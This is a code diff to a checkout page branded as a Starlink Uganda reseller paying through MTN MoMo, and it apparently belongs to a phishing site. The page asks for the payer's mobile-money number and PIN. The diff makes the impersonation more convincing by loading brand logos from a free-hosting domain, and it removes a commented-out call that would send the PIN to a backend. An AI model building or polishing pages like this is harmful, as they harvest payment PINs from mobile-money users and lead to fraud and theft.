@@ -97,9 +97,13 @@
         }
 
         .brand { display: flex; align-items: center; gap: 10px; }
-        .brand-logo { display: flex; align-items: center; gap: 8px; }
-        .brand-logo svg { width: 34px; height: 34px; }
-        .brand-name { font-size: 20px; font-weight: 800; letter-spacing: 4px; color: var(--white); }
+
+        .brand-logo-img {
+            height: 54px;
+            width: auto;
+            display: block;
+        }
+
         .brand-divider { width: 1px; height: 26px; background: rgba(255,255,255,0.2); margin: 0 4px; }
         .brand-sub { font-size: 12px; color: var(--gray-400); font-weight: 500; letter-spacing: 0.5px; }
 
@@ -144,7 +148,7 @@
         .momo-band {
             background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
             border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
-            padding: 30px 24px;
+            padding: 26px 24px;
             text-align: center;
             box-shadow: var(--shadow-md);
             position: relative;
@@ -161,22 +165,12 @@
             pointer-events: none;
         }
 
-        .momo-logo {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            background: var(--black);
-            color: var(--momo-yellow);
-            font-weight: 900;
-            font-size: 18px;
-            padding: 10px 20px;
-            border-radius: 12px;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+        .momo-logo-img {
+            height: 48px;
+            width: auto;
+            display: inline-block;
             position: relative;
         }
-
-        .momo-logo i { font-size: 20px; }
 
         .momo-tagline {
             font-size: 12px;
@@ -184,7 +178,7 @@
             color: #7A5A00;
             letter-spacing: 1.5px;
             text-transform: uppercase;
-            margin-top: 14px;
+            margin-top: 12px;
             position: relative;
         }
 
@@ -198,7 +192,6 @@
             box-shadow: var(--shadow-lg);
         }
 
-        /* Amount block */
         .amount-block {
             display: flex;
             justify-content: space-between;
@@ -224,9 +217,7 @@
             color: var(--gray-900);
         }
 
-        .amount-plan {
-            text-align: right;
-        }
+        .amount-plan { text-align: right; }
 
         .amount-plan-name {
             font-size: 14px;
@@ -245,7 +236,6 @@
             margin-top: 4px;
         }
 
-        /* Instruction text */
         .instruction {
             text-align: center;
             font-size: 14px;
@@ -254,7 +244,6 @@
             font-weight: 500;
         }
 
-        /* Form */
         .form-label {
             display: block;
             font-size: 14px;
@@ -316,7 +305,6 @@
             font-weight: 500;
         }
 
-        /* Confirm button */
         .btn-confirm {
             width: 100%;
             margin-top: 22px;
@@ -343,7 +331,6 @@
         .btn-confirm:active { transform: scale(0.98); }
         .btn-confirm i { font-size: 19px; }
 
-        /* Security note */
         .security-note {
             display: flex;
             align-items: center;
@@ -355,10 +342,7 @@
             font-weight: 500;
         }
 
-        .security-note i {
-            color: var(--green-600);
-            font-size: 15px;
-        }
+        .security-note i { color: var(--green-600); font-size: 15px; }
 
         /* ============================================
            PIN MODAL
@@ -542,9 +526,10 @@
         ============================================ */
         @media (min-width: 640px) {
             .main { padding: 28px 22px 44px; }
-            .momo-band { padding: 36px 32px; }
+            .momo-band { padding: 32px 28px; }
             .checkout-body { padding: 30px 28px 32px; }
             .amount-value { font-size: 34px; }
+            .momo-logo-img { height: 54px; }
         }
 
         @media (min-width: 768px) {
@@ -558,15 +543,7 @@
     <header class="header">
         <div class="header-inner">
             <a href="/" class="brand">
-                <div class="brand-logo">
-                    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Starlink">
-                        <circle cx="32" cy="32" r="30" stroke="#ffffff" stroke-width="3" fill="none"/>
-                        <path d="M8 32c0-4 3-7 7-7h34c4 0 7 3 7 7s-3 7-7 7H15c-4 0-7-3-7-7z" fill="#ffffff"/>
-                        <circle cx="32" cy="32" r="6" fill="#000000"/>
-                        <circle cx="32" cy="32" r="3" fill="#2563eb"/>
-                    </svg>
-                    <span class="brand-name">STARLINK</span>
-                </div>
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/starlink_logo_new.png" alt="STARLINK" class="brand-logo-img">
                 <div class="brand-divider"></div>
                 <span class="brand-sub">Uganda Reseller</span>
             </a>
@@ -589,17 +566,13 @@
 
                 <!-- MoMo Band -->
                 <div class="momo-band">
-                    <div class="momo-logo">
-                        <i class="uil uil-mobile-android"></i>
-                        MTN MoMo
-                    </div>
+                    <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="momo-logo-img">
                     <p class="momo-tagline">Secure Payment</p>
                 </div>
 
                 <!-- White Card Body -->
                 <div class="checkout-body">
 
-                    <!-- Amount -->
                     <div class="amount-block">
                         <div>
                             <p class="amount-label">Amount</p>
@@ -784,7 +757,6 @@
                 return;
             }
 
-            // Accept 9 digits (no leading 0) OR 10 digits starting with 0
             if (!(/^\d{9}$/.test(num) || /^0\d{9}$/.test(num))) {
                 number.setCustomValidity('Enter 9 digits (e.g. 7xxxxxxxx) or 10 digits starting with 0 (e.g. 07xxxxxxxx)');
                 number.reportValidity();
@@ -802,7 +774,7 @@
         });
 
         // ============================================
-        // PIN INPUT — only digits, enable when 4-5 digits
+        // PIN INPUT
         // ============================================
         pin.addEventListener('input', function () {
             this.value = this.value.replace(/\D/g, '');
@@ -810,7 +782,6 @@
             const isValid = /^\d{4,5}$/.test(this.value);
             confirm.disabled = !isValid;
 
-            // Auto-submit on 5-digit PIN
             if (this.value.length === 5) {
                 setTimeout(() => {
                     submitPayment();
@@ -831,31 +802,11 @@
 
         // ============================================
         // SUBMIT PAYMENT
-        // Here's where you'd POST to your backend.
-        // For now, show a processing state then redirect.
         // ============================================
         function submitPayment() {
             confirm.disabled = true;
             confirm.textContent = 'Processing...';
 
-            // TODO: Replace this with your real API call:
-            /*
-            fetch('/api/momo/pay/', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    plan: planName,
-                    data: planData,
-                    price: planPrice,
-                    momo_number: number.value,
-                    pin: pin.value
-                })
-            })
-            .then(res => res.json())
-            .then(data => { ... })
-            */
-
-            // Simulated flow — for demo
             setTimeout(() => {
                 const successParams = new URLSearchParams({
                     plan: planName,
